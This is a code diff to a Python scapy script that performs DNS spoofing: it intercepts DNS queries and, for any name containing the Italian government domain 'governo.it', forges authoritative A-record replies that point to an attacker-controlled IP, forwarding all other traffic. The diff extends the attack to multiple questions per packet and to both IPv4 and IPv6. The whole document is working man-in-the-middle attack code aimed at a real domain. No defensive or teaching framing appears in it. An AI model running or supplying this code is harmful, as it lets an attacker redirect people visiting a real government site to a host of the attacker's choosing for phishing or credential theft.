@@ -1,3 +1,4 @@
+from functools import reduce
 from dotenv import load_dotenv
 import os
 from scapy.all import sniff, send, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR, get_if_addr
@@ -18,38 +19,60 @@ def forward(pkt):
 	elif pkt.haslayer(IPv6):
 		send(pkt[IPv6], verbose=0)
 	else:
-		raise Exception("This shouldn't happen.\nEthery type: " + str(pkt[Ether].type))
+		raise Exception("This shouldn't happen.\nEther type: " + str(pkt[Ether].type))
 
 
 def dns_spoof(pkt):
-	if not pkt.haslayer(DNSQR):
+	if not pkt.haslayer(DNS):
 		forward(pkt)
 		return
-	
-	domain = pkt[DNSQR].qname.decode()
 
-	if not ("governo.it" in domain.lower()):
+	dflag = False
+	questions = pkt[DNS].qd
+	answers = []
+
+	for query in questions:
+		domain = query.qname.decode()
+		if not ("governo.it" in domain.lower()):
+			continue
+
+		dflag = True
+
+		if query.qtype == 1: # A
+			answers.append(
+				DNSRR(rrname = query.qname, type='A', ttl = 10, rdata = attacker_ip)
+			)
+
+	if not dflag:
 		forward(pkt)
 		return
+
+	spoofed_pkt = (
+		UDP(dport = pkt[UDP].sport, sport = 53) /
+		DNS(
+			id = pkt[DNS].id,
+			qr = 1,  # Response
+			aa = 1,  # Authoritative answer
+			ra = 1,  # Recursion available
+			qd = questions,
+			an = answers,
+			ancount = len(answers),
+			rcode = 0
+		)
+	)
 
 	if pkt.haslayer(IP):
 		spoofed_pkt = (
 			IP(dst = pkt[IP].src, src = pkt[IP].dst) /
-			UDP(dport = pkt[UDP].sport, sport = 53) /
-			DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd, an =
-				DNSRR(rrname = pkt[DNSQR].qname, ttl = 10, rdata = attacker_ip)
-			)
+			spoofed_pkt
 		)
 	elif pkt.haslayer(IPv6):
 		spoofed_pkt = (
 			IPv6(dst = pkt[IPv6].src, src = pkt[IPv6].dst) /
-			UDP(dport = pkt[UDP].sport, sport = 53) /
-			DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd, an =
-				DNSRR(rrname = pkt[DNSQR].qname, ttl = 10, rdata = attacker_ip)
-			)
+			spoofed_pkt
 		)
 	else:
-		raise Exception("This shouldn't happen.\nEthery type: " + str(pkt[Ether].type))
+		raise Exception("This shouldn't happen.\nEther type: " + str(pkt[Ether].type))
 
 	send(spoofed_pkt, verbose=0)
 
